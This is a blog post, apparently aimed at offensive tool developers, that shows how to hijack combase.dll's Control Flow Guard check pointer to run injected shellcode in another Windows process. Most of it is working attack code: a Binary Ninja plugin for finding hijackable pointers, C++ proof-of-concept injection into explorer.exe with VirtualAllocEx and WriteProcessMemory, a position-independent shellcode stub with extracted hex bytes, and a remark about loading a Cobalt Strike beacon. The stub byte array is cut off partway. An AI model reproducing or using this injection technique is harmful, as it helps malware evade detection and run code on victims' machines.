When performing process injection, one of the most important IOCs that make up behavioural signatures is passing execution to our shellcode. Whilst there are multiple techniques to doing so and this is certainly nothing purely "new" - in this post I want to showcase not just a "new proof-of-concept technique", but the entire process I went through in hope that this can become a proper addition to a capability developer's skill set.

Since the release of [ThreadlessInject](https://github.com/CCob/ThreadlessInject) by [@\_EthicalChaos\_](https://x.com/_EthicalChaos_) I have really enjoyed playing around with hijacking control flow via various pointers on a system, particularly those in memory regions that are marked as readable and writeable as it avoids noisy calls such as `VirtualProtect` and it's alternatives.

# What is a Data Pointer?

What I have dubbed a "data pointer" is simply a value in a readable and writeable memory section of a binary that points to a function to be called by code.

For a simple example, let's take a look at the following source code:

```cpp
#include <Windows.h>
#include <stdio.h>

volatile FARPROC pointer = 0;

volatile int func(void)
{
	return 0;
}

int main(void)
{
	pointer = (FARPROC)func;

	printf(
		"pointer\t@ 0x%016llx\n"
		"func\t@ 0x%016llx\n",
		func, pointer);

	pointer();
	return 0;
}
```

For those unfamiliar, you can ignore the `volatile` keyword in the source code for now, its only purpose here is to stop the compiler from optimising out the `func` function.

As you can see, we have a global variable `pointer` which at runtime is set to point to the `func` function. This is later used to call `func` after the `printf` call. Put simply, if we can overwrite `pointer`, we can control which code is executed by the `pointer()` line. This can be shown further by taking a look at a decompilation of the executable.

# Enumerating Hijackable Data Pointers

The first step to this process is selecting target binaries to hunt for hijacks within. For my goals (process injection) I chose those within `KnownDlls` as these are not only commonly used DLLs across the system, but they are also all loaded at the same base virtual address in every process. This means that we can simply locate the pointers in memory of our loader process, and perform a single write to the remote process to perform the hijack.

## Finding By Hand

I first started taking a look at `ntdll.dll` as I figured if I could find and hijack a commonly called pointer, it meant I could hijack control flow of almost any process on the system. There was no magic here, I just manually checked references to every entry in the `.data` section of `ntdll` until I found call references within Binary Ninja.

As shown below, here are some exemplary (albeit not very useful) pointers that could be overwritten to hijack calls to `RtlpDebugPageHeapCreate`, `RtlpDebugPageHeapDestroy`, and in rare cases `RtlCreateHeap` and `RtlDestroyHeap`.

![Image of binary ninja decompilation of ntdll.dll, showing two hijackable pointers](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/enumerating_pointers_by_hand.png)

As you have probably noticed, this is a huge time sink and can be automated in a variety of ways.

## Finding Automatically

To find these pointers automatically we need to perform one of the following:

- Enumerate values in `.data` for references which are `call` instructions
- Find a code pattern (e.g. `jmp rax` instructions) that we can search for in the `.text` section.

The first approach is much more viable, however at the time of writing said plugin, I had ran into issues with the Binary Ninja API when enumerating code references, and as such I went with option two.

If we take a look at the LLIL (low-level interpreted language) of the exemplary hijackable pointers in `ntdll.dll`, we will see the following `<return> tailcall(rax)` pattern.

![Image of binary ninja decompilation of RtlpDebugPageHeapDestroy, showing the `<return> tailcall(rax)` pattern](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/hijack_pattern_llil.png)

This is a pretty consistent pattern throughout various hijackable pointers, and as such I wrote a small (terribly written) Binary Ninja plugin to enumerate this pattern, and check if the value in rax was within the `.data` section and print the output to the log.

```python
import os
from binaryninja import *


def scan(bv: BinaryView) -> None:
    data_section: Section = bv.sections.get(".data")
    if data_section == None:
        print("Failed to find .data section")
        return
    
    data_start = data_section.start
    data_end = data_section.end
    
    for func in bv.functions:
        try:
            for block in func.llil.basic_blocks:
                instructions = list(block)
                if str(instructions[-1]) == "<return> tailcall(rax)":
                    ops = instructions[0].operands
                    if ops[0] == "rax":
                        data_ptr = ops[1].src.value.value
                        if data_ptr < data_start or data_ptr > data_end:
                            continue
                        print(f".data hijack: [{func.name}] ptr: @{hex(data_ptr)} (.data offset: {hex(data_ptr - data_start)})")
        except ILException:
            print(f"Could not load llil for function {func.name}")
    return


# Init & register the plugin
PluginCommand.register("DataHijack\\Scan Hijacks", "Scan for hijacks", scan)
```

Running this on `ntdll.dll` gives the following output, which in fact does show us the pointer we found manually:

```
[ScriptingProvider] .data hijack: [RtlpDebugPageHeapDestroy] ptr: @0x180166420 (.data offset: 0x420)
```

After experimenting with various target DLLs I eventually stumbled upon these Control Flow Guard pointers in `combase.dll`, ![Binary Ninja decompilation of combase.dll `.data` section](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/combase_hijackable_pointers.png)

The target pointer of interest is `__guard_check_icall_fptr` as it is referenced by ~2000 functions that have been automatically generated by the MIDL compiler as stub functions for COM proxying. [Read more here](https://learn.microsoft.com/en-us/windows/win32/api/rpcproxy/nf-rpcproxy-ndrproxyforwardingfunction13).

![BinaryNinja decompilation of combase.dll, showing call references of hijackable pointer](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/combase_references.png)

# Writing a Proof of Concept

Now that we have our target pointer (`combase.dll!__guard_check_icall_fptr`), we can start writing a proof of concept for this, for purposes of this post we will be weaponising it as process injection. The POC will have to perform the following:

1. Locate the target pointer in memory of the current process
2. Construct a shellcode stub to ensure clean, non-blocking execution of payload
3. Write stub and shellcode to target process
4. Overwrite the pointer in the remote process

## Locating Pointers in Memory

Thanks to our target binary being within `KnownDlls`, we can just locate the pointer in our own process, as it will be located at the same base address in our target process.

The first step is to locate the base address of our target binary, for sake of a simple proof of concept we can simply use `LoadLibrary` to do so.

```cpp
HMODULE combase = LoadLibraryA("combase.dll");
```

Next comes the more difficult part. We need to locate the address of that pointer in memory, but also have our POC function well across windows versions. Luckily for us, some of these `NdrProxy` functions are exported by combase, and as such we can egghunt within them for the pointer.

```cpp
FARPROC NdrProxyForwardingFunction13 = GetProcAddress(combase, "NdrProxyForwardingFunction13");
LOG_INFO("NdrProxyForwardingFunction13 @ 0x%016llx", (size_t)NdrProxyForwardingFunction13);
```

As we want this to work cross-version, instead of using a static offset from the binary base, we will use the highlighted instructions to locate the reference in memory and parse it that way.

![Binary Ninja disassembly of combase.dll!NdrProxyForwardingFunction13 to show the egg we will hunt for](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/finding_egg.png)

It is important to note that the last instruction (the `call`) is a relative call based on `rip`. As such, we will need to take this offset, and add it to the address of the next instruction in memory in order to calculate our pointer's location.

For those who are less familiar with assembly, I recommend playing around with [Defuse's online assembler](https://defuse.ca/online-x86-assembler.htm#disassembly2)

In this case, we can see that `ff 15` corresponds to the type of call instruction, and `e7 c3 17 00` is the offset in little endian format.

```
ff 15 e7 c3 17 00       call   QWORD PTR [rip+0x17c3e7]        # 0x17c3ed
```

Now that we know our egg, we can define and hunt for it as follows, we will be using the EggHunt function from VX-API (thanks vx-underground <3):

```cpp
//
// Search a region of memory for an egg. Returns NULL on failure.
//
PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength)
{
    if (!RegionStart || !RegionLength || !Egg || !EggLength)
        return NULL;

    for (CHAR* pchar = (CHAR*)RegionStart; RegionLength >= EggLength; ++pchar, --RegionLength)
    {
        if (memcmp(pchar, Egg, EggLength) == 0)
            return pchar;
    }
    return NULL;
}

int main(void)
{
    HMODULE combase = LoadLibraryA("combase.dll");
    
    FARPROC NdrProxyForwardingFunction13 = GetProcAddress(combase, "NdrProxyForwardingFunction13");
    LOG_INFO("NdrProxyForwardingFunction13 @ 0x%016llx", (size_t)NdrProxyForwardingFunction13);

    BYTE egg___guard_check_icall_fptr[] = {
        0x4c, 0x8b, 0x11,        // mov     r10, qword [rcx]
        0x49, 0x8b, 0x4a, 0x68,  // mov     rcx, qword [r10+0x68]
        0xff, 0x15               // call    qword [rel __guard_check_icall_fptr]  {_guard_check_icall_nop}
        // next 4 bytes are the offset
    };

    BYTE* egg_location = (BYTE*)EggHunt(NdrProxyForwardingFunction13, 256, egg___guard_check_icall_fptr, sizeof(egg___guard_check_icall_fptr));
    if (!egg_location)
    {
        LOG_ERROR("Failed to locate __guard_check_icall_fptr call offset @ combase.dll!NdrProxyForwardingFunction13");
        return;
    }
    BYTE* egg_end = egg_location + sizeof(egg___guard_check_icall_fptr);
    LOG_INFO("combase.dll!__guard_check_icall_fptr egg @ %p", egg_location);
    LOG_INFO("combase.dll!__guard_check_icall_fptr egg_end @ %p", egg_end);

	DWORD offset = *(DWORD*)egg_end;
    LOG_INFO("combase.dll!__guard_check_icall_fptr call offset => 0x%08lx", offset);
    FARPROC* __guard_check_icall_fptr = (FARPROC*)(egg_end + offset + sizeof(DWORD));
    FARPROC _guard_check_icall_nop = *__guard_check_icall_fptr;
    LOG_SUCCESS("combase.dll!__guard_check_icall_fptr @ %p", __guard_check_icall_fptr);
    LOG_SUCCESS("combase.dll!_guard_check_icall_nop @ %p", _guard_check_icall_nop);
}
```

Running this to test gives us the following output, confirming that we have successfully located our pointer in memory:

![Screenshot of terminal output from POC, showing that we have successfully located combase.dll!__guard_check_icall_fptr](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/testing_pointer_location.png)

## Writing Shellcode to the Target Process

Since making this specific part of process injection "stealthy" isn't the goal of this post, we will simply use the `VirtualAllocEx` and `WriteProcessMemory` WinAPIs to do so. The `0xc0` is the size of the stub rounded up to the nearest 16 bytes, which we will get into a little bit later.

```cpp
BYTE* base_address = (BYTE*)VirtualAllocEx(process, NULL, sizeof(shellcode) + 0xc0, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(process, base_address, shellcode, sizeof(shellcode), NULL);
```

## Overwriting Pointers in a Target Process

For the purposes of testing, I will be using `explorer.exe`. This is because explorer is both a relatively safe process to crash (it restarts itself) and it is very heavily reliant on COM proxying, hence even right clicking will trigger our control flow hijack.

As for actually writing the pointer, we will again use `VirtualProtect` and `WriteProcessMemory` to do so as follows. You may notice that `VirtualAlloc` is being used here, and that's because we are using a pointer in `.rdata` for this post, as I don't want to burn other pointers in this post. **Finding a better pointer is left to the reader.**

```cpp
DWORD oldprotect = NULL;
BOOL success = VirtualProtectEx(process, __guard_check_icall_fptr, sizeof(FARPROC), PAGE_READWRITE, &oldprotect);
WriteProcessMemory(process, __guard_check_icall_fptr, &base_address, sizeof(PVOID), NULL);
success = VirtualProtectEx(process, __guard_check_icall_fptr, sizeof(FARPROC), oldprotect, &oldprotect);
```

At this point, we can give the POC a quick test, and we have shellcode execution!
![Testing the basic POC and we see shellcode execution via calc.exe launching](/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/testing_poc_basic.png)

There are however two issues:

- Target process either crashes or hangs after executing the shellcode
- Pointer is not restored after execution, meaning multiple shells may be caught creating unnecessary noise

## Writing a Shellcode Stub

Our shellcode stub will perform the following:

1. Restore the original pointer value to prevent multiple callbacks
2. Execute the payload in a new thread
3. Return cleanly to the original

To save us a lot of time, and to make use of compiler optimisations, we can actually just write C and compile via a non-MSVC compiler in order to compile position independent code. We can do that as follows using `x86_64-w64-mingw32-gcc`.

**source code**
```cpp
void stub(void)
{
	// save registers
    asm(
        "push rax\n"
        "push rdi\n"
        "push rcx\n"
        "push rdi\n"
        "push rsi\n"
        "push r8\n"
        "push r9\n"
        "push r10\n"
        "push r11\n"
        "push r12\n"
        "push r13\n"
    );

	// placeholder variables that we will replace in the loader
    tVirtualProtect VirtualProtect = (tVirtualProtect)0x1111111111111111;
    tCreateThread CreateThread = (tCreateThread)0x2222222222222222;
    FARPROC* icall_fptr = (FARPROC*)0x3333333333333333;
    FARPROC icall_fptr_orig = (FARPROC)0x4444444444444444;
    DWORD oldprot = 0;

	// restore original pointer value
    VirtualProtect(icall_fptr, sizeof(FARPROC), PAGE_READWRITE, &oldprot);
    *icall_fptr = icall_fptr_orig;
    VirtualProtect(icall_fptr, sizeof(FARPROC), oldprot, &oldprot);

	// create thread starting at shellcode address
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)0x5555555555555555, NULL, NULL, NULL);

	// restore register values
    asm(
        "pop rax\n"
        "pop rdi\n"
        "pop rcx\n"
        "pop rdi\n"
        "pop rsi\n"
        "pop r8\n"
        "pop r9\n"
        "pop r10\n"
        "pop r11\n"
        "pop r12\n"
        "pop r13\n"
    );

	// return 0, as that's what the original function did.
    return 0;
}
```

**compilation command line**
```bash
x86_64-w64-mingw32-gcc -fPIC -masm=intel ./stub.c -o stub.exe
```

We can then extract the `stub` function from the executable using a disassembler, for this I used Binary Ninja's `bv.read` api, allowing us to read raw bytes from an address range.

```python
bv.read(0x140001530, 0x1400015e6  - 0x140001530 + 1).hex()

'4154534883ec5850575157564150415141524153415441554c8d4c244cc744244c00000000ba0800000049bc33333333333333334c894c24384c89e141b80400000048bb1111111111111111ffd34c8b4c2438448b44244c4c89e148b84444444444444444ba0800000049890424ffd3c7442420000000004531c931d248c74424280000000031c949b8555555555555555548b82222222222222222ffd0585f595f5e41584159415a415b415c415d4883c4585b415cc3'
```

Now that we have this, we can replace the placeholder values and then write it before the payload in memory of the target process. The payload will be stored at `allocated_address + 0xc0`, as we need a 16-byte alligned base address for our shellcode.

```cpp
BYTE stub[] = {
	0x41,0x54,0x53,0x48,0x83,0xec,0x58,0x50,0x57,0x51,0x57,0x56,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x4c,0x8d,0x4c,0x24,0x4c,0xc7,0x44,0x24,0x4c,0x00,0x00,0x00,0x00,0xba,0x08,0x00,0x00,0x00,

};
HMODULE kernel32 = GetModuleHandleA("KERNEL32.DLL");
FARPROC _VirtualProtect = GetProcAddress(kernel32, "VirtualProtect");

WriteProcessMemory(process, base_address, stub, sizeof(stub), NULL);
WriteProcessMemory(process, shellcode_address, shellcode, sizeof(shellcode), NULL);
```

Replacing the shellcode for a Cobalt Strike beacon, we can now give it a test. 

_Note: avoid msfvenom's `windows/x64/exec` shellcode as it crashes the target process after execution and could give to misleading results here._
